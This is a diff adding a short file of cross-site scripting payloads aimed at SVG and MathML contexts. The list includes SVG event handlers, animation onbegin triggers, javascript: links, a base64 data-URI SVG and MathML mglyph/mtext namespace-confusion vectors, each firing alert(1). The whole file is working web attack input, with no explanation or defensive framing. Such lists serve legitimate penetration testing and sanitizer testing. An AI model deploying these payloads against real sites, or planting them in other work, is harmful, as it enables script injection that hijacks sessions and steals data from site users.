@@ -1,0 +1,14 @@
+# XSS Payloads for SVG/MathML Context
+<svg onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg><script>alert&lpar;1&rpar;</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributename=x to=1>
+<svg><animateTransform onbegin=alert(1) attributeName=transform type=rotate>
+<svg><a xlink:href="javascript:alert(1)"><rect width=100 height=100/></a></svg>
+<svg><foreignObject><body onload=alert(1)></foreignObject></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+PGEgeGxpbms6aHJlZj0iamF2YXNjcmlwdDphbGVydCgxKSI+PHJlY3Qgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiLz48L2E+PC9zdmc+#x">
+<math><mtext><img src=x onerror=alert(1)></mtext></math>
+<math><mtext><table><mglyph><svg xmlns="http://www.w3.org/2000/svg"><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg></mglyph></table></mtext></math>
+<math><mi><xss onclick=alert(1)>click</xss></mi></math>
